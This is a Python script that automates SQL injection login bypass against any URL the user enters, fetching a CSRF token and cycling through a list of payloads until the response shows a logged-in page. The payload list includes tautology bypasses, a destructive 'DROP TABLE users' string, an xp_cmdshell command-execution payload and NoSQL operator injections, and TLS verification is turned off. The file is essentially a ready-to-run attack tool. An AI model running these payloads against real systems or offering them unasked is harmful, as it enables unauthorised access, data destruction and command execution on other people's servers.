import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(s, url):
    try:
        r = s.get(url, verify=False)  # Eliminado proxies
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf_input = soup.find("input", {"name": "csrf"})
        if csrf_input and 'value' in csrf_input.attrs:
            return csrf_input['value']
        else:
            print("CSRF token not found.")
            return None
    except Exception as e:
        print(f"Error getting CSRF token: {e}")
        return None

def exploit_sqli(s, url, payload):
    csrf_token = get_csrf_token(s, url)
    if not csrf_token:
        return False

    data = {
        "csrf": csrf_token,
        "username": payload,
        "password": "randomtext"
    }

    try:
        r = s.post(url, data=data, verify=False, timeout=10)  
        print(f"Payload: {payload}")  
        print(f"Status Code: {r.status_code}")  
        print(f"Response Text: {r.text[:500]}")  
                
        # Verifica si la respuesta contiene el texto que indica éxito
        if "Log out" in r.text or "Logout" in r.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return False

if __name__ == "__main__":
    try:
        url = input("Ingrese la URL de su sitio web: ").strip()
        sqli_payloads = [
            "'",
            "1=1",
            "administrator'--",
            "' OR '1'='1",
            "' OR 1=1 --",
            "' OR 'a'='a",
            "' OR 1 --",
            "' OR '1'='1' --",
            "' OR '1'='1' ({",
            "' OR '' = '",
            "' OR 1=1 #",
            "admin' --",
            "'; DROP TABLE users; --",
            "' OR 'x'='x",
            "' OR 1=1 LIMIT 1; --",
            "' OR '1'='1'/*",
            "' OR '1'='1'--",
            "' OR '1'='1'#",
            "username' AND '1'='1",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR '1'='1' AND '1'='1",
            '{"$ne":""}',
            '{"$regex":"wien.*"}',
            '{"$ne":""}',
            '{"$regex":"admin.*"}'
        ]

    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

    s = requests.Session()
    successful_payloads = []

    for payload in sqli_payloads:
        if exploit_sqli(s, url, payload):
            print(f"[+] SQL injection successful with payload: {payload}")
            successful_payloads.append(payload)
            break  # Detener el bucle al encontrar un payload exitoso
        else:
            print(f"[-] SQL injection unsuccessful with payload: {payload}")

    if successful_payloads:
        print(f"[+] Successful payload: {successful_payloads[0]}")
    else:
        print("[-] No successful SQL injection payloads found.")
